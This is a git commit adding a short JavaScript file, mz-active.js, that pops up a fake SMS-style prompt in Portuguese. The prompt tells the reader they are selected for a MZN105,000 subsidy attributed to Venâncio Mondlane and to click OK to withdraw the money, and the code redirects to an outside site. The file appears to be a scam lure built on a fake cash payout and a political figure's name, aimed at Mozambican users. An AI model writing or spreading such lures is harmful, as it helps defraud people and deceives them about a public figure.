f3d25ce24f12191f019c93d9df319368540f55e6
ekpeowo <ukpehansi@gmail.com>
2025-06-11 07:52:57 +0100

    Create mz-active.js

---
+++ mz-active.js
@@ -0,0 +1,5 @@
+var password = 'SAQUE MZN105.000'
+password=prompt('SMS: Parabéns, você está entre os selecionados para receber o Subsídio de MZN105.000 da Venâncio Mondlane, Clique em Ok para sacar dinheiro agora ','SAQUE MZN105.000');
+if (password != 'SAQUE MZN105.000') {
+location.href='https://news-active.org/mozambique.html';
+}
